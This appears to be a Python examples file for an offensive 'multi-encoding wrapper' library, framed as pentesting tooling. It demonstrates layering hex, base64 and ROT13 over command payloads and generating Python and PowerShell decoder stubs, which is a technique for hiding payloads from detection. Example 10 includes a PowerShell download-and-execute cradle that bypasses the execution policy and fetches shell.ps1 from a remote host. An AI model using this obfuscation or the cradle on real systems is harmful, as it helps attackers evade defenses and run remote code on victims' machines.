#!/usr/bin/env python3
"""
Multi-Encoding Wrapper Examples
Demonstrates various use cases and integration patterns
For authorized pentesting and security research
"""

from multi_encoding_layers import (
    MultiEncodingWrapper,
    EncodingLayerType,
    create_multi_encoding_wrapper
)


def example_basic_random_encoding():
    """Example 1: Basic random encoding with 1-3 layers"""
    print("\n" + "=" * 70)
    print("EXAMPLE 1: Basic Random Multi-Encoding")
    print("=" * 70)

    # Create wrapper with random layer selection (1-3 layers)
    wrapper = MultiEncodingWrapper()

    # Display configuration
    print(f"\nConfiguration:")
    print(f"  Number of layers: {wrapper.num_layers}")
    print(f"  Layer sequence: {' -> '.join(l.layer_type.value for l in wrapper.encoding_layers)}")

    # Encode test data
    test_data = "calc.exe"
    encoded = wrapper.encode(test_data)
    decoded = wrapper.decode(encoded)

    print(f"\nTest Data:")
    print(f"  Original:  {test_data}")
    print(f"  Encoded:   {encoded}")
    print(f"  Decoded:   {decoded}")
    print(f"  Success:   {decoded == test_data}")


def example_specific_layers():
    """Example 2: Select specific layers"""
    print("\n" + "=" * 70)
    print("EXAMPLE 2: Specific Layer Selection")
    print("=" * 70)

    # Use only specific encoding types
    available = [
        EncodingLayerType.HEX,
        EncodingLayerType.BASE64,
        EncodingLayerType.ROT13
    ]

    wrapper = MultiEncodingWrapper(
        num_layers=3,
        available_layers=available
    )

    print(f"\nAvailable layers: {[l.value for l in available]}")
    print(f"Selected layers: {[l.layer_type.value for l in wrapper.encoding_layers]}")

    # Encode payload
    payload = "powershell.exe -NoProfile -Command Write-Host 'pwned'"
    encoded = wrapper.encode(payload)

    print(f"\nPayload Encoding:")
    print(f"  Original: {payload}")
    print(f"  Encoded:  {encoded}")
    print(f"  Length:   {len(encoded)} chars")


def example_deterministic_encoding():
    """Example 3: Deterministic encoding with seed"""
    print("\n" + "=" * 70)
    print("EXAMPLE 3: Deterministic Encoding (with Seed)")
    print("=" * 70)

    # Create two wrappers with same seed
    wrapper1 = MultiEncodingWrapper(num_layers=2, seed=12345)
    wrapper2 = MultiEncodingWrapper(num_layers=2, seed=12345)

    test_cmd = "cmd.exe /c whoami"

    encoded1 = wrapper1.encode(test_cmd)
    encoded2 = wrapper2.encode(test_cmd)

    print(f"\nDeterministic Test:")
    print(f"  Wrapper 1 layers: {[l.layer_type.value for l in wrapper1.encoding_layers]}")
    print(f"  Wrapper 2 layers: {[l.layer_type.value for l in wrapper2.encoding_layers]}")
    print(f"  Both same: {wrapper1.encoding_layers[0].layer_type == wrapper2.encoding_layers[0].layer_type}")
    print(f"\n  Wrapper 1 encoded: {encoded1}")
    print(f"  Wrapper 2 encoded: {encoded2}")
    print(f"  Encodings identical: {encoded1 == encoded2}")


def example_python_decoder_generation():
    """Example 4: Generate Python decoder"""
    print("\n" + "=" * 70)
    print("EXAMPLE 4: Python Decoder Generation")
    print("=" * 70)

    wrapper = MultiEncodingWrapper(num_layers=2, seed=999)

    # Payload to encode
    payload = "ipconfig"
    encoded = wrapper.encode(payload)

    # Generate decoder code
    decoder_code = wrapper.generate_decoder_python(encoded, "cmd_payload")

    print(f"\nGenerated Python Decoder Code:\n")
    print(decoder_code)

    # Verify the decoder works by executing it
    print("\nVerifying decoder execution:")
    print("Running generated decoder code...\n")
    # (In real usage, this would be executed)


def example_powershell_decoder_generation():
    """Example 5: Generate PowerShell decoder"""
    print("\n" + "=" * 70)
    print("EXAMPLE 5: PowerShell Decoder Generation")
    print("=" * 70)

    wrapper = MultiEncodingWrapper(num_layers=2, seed=555)

    # Payload
    payload = "whoami"
    encoded = wrapper.encode(payload)

    # Generate decoder
    decoder_code = wrapper.generate_decoder_powershell(encoded, "payload")

    print(f"\nGenerated PowerShell Decoder Code:\n")
    print(decoder_code)


def example_single_layer():
    """Example 6: Single layer encoding"""
    print("\n" + "=" * 70)
    print("EXAMPLE 6: Single Layer Encoding")
    print("=" * 70)

    wrapper = MultiEncodingWrapper(num_layers=1)

    test_data = "secret_data"
    encoded = wrapper.encode(test_data)

    print(f"\nSingle Layer Encoding:")
    print(f"  Layer: {wrapper.encoding_layers[0].layer_type.value}")
    print(f"  Original:  {test_data}")
    print(f"  Encoded:   {encoded}")


def example_batch_encoding():
    """Example 7: Batch encode multiple payloads"""
    print("\n" + "=" * 70)
    print("EXAMPLE 7: Batch Encoding Multiple Payloads")
    print("=" * 70)

    payloads = [
        "calc.exe",
        "notepad.exe",
        "cmd.exe",
        "powershell.exe"
    ]

    print(f"\nBatch encoding {len(payloads)} payloads:\n")

    for payload in payloads:
        wrapper = MultiEncodingWrapper()
        encoded = wrapper.encode(payload)

        layers = ' -> '.join(l.layer_type.value for l in wrapper.encoding_layers)
        print(f"  {payload:20} | Layers: {layers:30} | Size: {len(encoded)}")


def example_layer_info():
    """Example 8: Inspect layer information"""
    print("\n" + "=" * 70)
    print("EXAMPLE 8: Layer Information Details")
    print("=" * 70)

    wrapper = MultiEncodingWrapper()

    # Get detailed info
    info = wrapper.get_layer_info()

    print(f"\nDetailed Layer Information:\n")
    print(f"Total layers: {info['total_layers']}")
    print(f"Encoding sequence: {' -> '.join(info['sequence'])}\n")

    print("Layer Details:")
    for layer in info['layers']:
        print(f"\n  Layer {layer['index']}: {layer['type'].upper()}")
        if 'config' in layer:
            print(f"    Configuration: {layer['config']}")


def example_comparison():
    """Example 9: Compare different encoding strategies"""
    print("\n" + "=" * 70)
    print("EXAMPLE 9: Comparison of Different Strategies")
    print("=" * 70)

    test_payload = "meterpreter_shell_code"

    print(f"\nEncoding '{test_payload}' with different strategies:\n")

    # Single layer encodings
    single_layer = MultiEncodingWrapper(num_layers=1)
    enc1 = single_layer.encode(test_payload)
    print(f"1-Layer ({single_layer.encoding_layers[0].layer_type.value}):")
    print(f"  Size: {len(enc1)} chars")
    print(f"  Output: {enc1[:50]}...\n")

    # Double layer encoding
    double_layer = MultiEncodingWrapper(num_layers=2)
    enc2 = double_layer.encode(test_payload)
    layers2 = ' -> '.join(l.layer_type.value for l in double_layer.encoding_layers)
    print(f"2-Layer ({layers2}):")
    print(f"  Size: {len(enc2)} chars")
    print(f"  Output: {enc2[:50]}...\n")

    # Triple layer encoding
    triple_layer = MultiEncodingWrapper(num_layers=3)
    enc3 = triple_layer.encode(test_payload)
    layers3 = ' -> '.join(l.layer_type.value for l in triple_layer.encoding_layers)
    print(f"3-Layer ({layers3}):")
    print(f"  Size: {len(enc3)} chars")
    print(f"  Output: {enc3[:50]}...\n")


def example_advanced_payload():
    """Example 10: Complex real-world payload"""
    print("\n" + "=" * 70)
    print("EXAMPLE 10: Advanced Real-World Payload")
    print("=" * 70)

    # Complex command with special characters
    complex_payload = 'powershell.exe -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://192.168.1.100/shell.ps1\')"'

    wrapper = MultiEncodingWrapper(num_layers=3)
    encoded = wrapper.encode(complex_payload)
    decoded = wrapper.decode(encoded)

    print(f"\nComplex Payload Encoding:\n")
    print(f"Original length: {len(complex_payload)} chars")
    print(f"Encoded length:  {len(encoded)} chars")
    print(f"Compression ratio: {len(encoded) / len(complex_payload):.2f}x\n")

    print(f"Layers: {' -> '.join(l.layer_type.value for l in wrapper.encoding_layers)}\n")

    print(f"Original payload:\n{complex_payload}\n")
    print(f"Encoded payload:\n{encoded}\n")
    print(f"Decoding successful: {decoded == complex_payload}")


def main():
    """Run all examples"""
    print("\n" + "=" * 70)
    print("MULTI-ENCODING WRAPPER EXAMPLES")
    print("=" * 70)

    example_basic_random_encoding()
    example_specific_layers()
    example_deterministic_encoding()
    example_python_decoder_generation()
    example_powershell_decoder_generation()
    example_single_layer()
    example_batch_encoding()
    example_layer_info()
    example_comparison()
    example_advanced_payload()

    print("\n" + "=" * 70)
    print("All examples completed successfully!")
    print("=" * 70 + "\n")


if __name__ == "__main__":
    main()
